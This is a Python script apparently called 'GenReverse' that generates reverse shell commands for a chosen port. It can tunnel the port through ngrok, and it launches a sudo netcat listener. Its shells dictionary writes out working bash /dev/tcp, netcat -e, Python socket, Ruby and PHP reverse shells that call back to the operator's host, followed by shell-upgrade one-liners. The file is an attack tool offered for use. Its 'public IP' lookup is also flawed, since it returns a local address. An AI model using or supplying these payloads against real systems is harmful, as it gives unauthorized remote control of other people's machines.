import os
import time
from argparse import ArgumentParser
from termcolor import colored
import pyfiglet
from pyngrok import ngrok
from scapy.all import Ether, IP


def print_banner():
    print(pyfiglet.figlet_format("GenReverse"))


def get_public_ip():
    return IP(dst="0.0.0.0").src


def print_shell_commands(ip, port):
    shells = {
        'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'netcat': f'nc -e /bin/sh {ip} {port}',
        'python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        'ruby': f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'php': f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
    }

    for shell_name, shell_command in shells.items():
        print(colored(f'\n[{shell_name.upper()}]', 'blue'))
        print(shell_command)

    print_upgrade_shell_commands()


def print_upgrade_shell_commands():
    print(colored("\n#############################################", "blue"))
    print(colored("\nTo upgrade the shell use:", "blue"))
    print(colored("\npython -c 'import pty;pty.spawn(\"/bin/bash\")'", "red"))
    print(colored("\nOr", "blue"))
    print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))


def launch_listener(port):
    print(colored("\nLaunching the listener...", "red"))
    time.sleep(2)
    os.system(f'\n\nsudo nc -lvnp {port}')


def usengrok(port):
    print("\nActivation of Ngrok..")
    time.sleep(2)
    connection = ngrok.connect(port, "tcp").public_url
    ssh, _ = connection.strip("tcp://").split(":")
    print("\nUrl ngrok: ", ssh)
    print_shell_commands(ssh, port)
    launch_listener(port)


def reverse_shell(ip, port):
    print_shell_commands(ip, port)
    launch_listener(port)


def parse_args():
    parser = ArgumentParser(description='Generate reverse shell commands.')
    parser.add_argument('-p', '--port', type=int, required=True, help='The listening port.')
    parser.add_argument('-n', '--ngrok', action='store_true', help='Use ngrok for public tunneling.')
    return parser.parse_args()


def main():
    args = parse_args()

    print_banner()
    public_ip = get_public_ip()
    print(colored("####################################################", "blue"))
    print(colored("\nYour IP :", "red"), "[", public_ip, "]")

    if args.ngrok:
        usengrok(args.port)
    else:
        reverse_shell(public_ip, args.port)


if __name__ == "__main__":
    main()
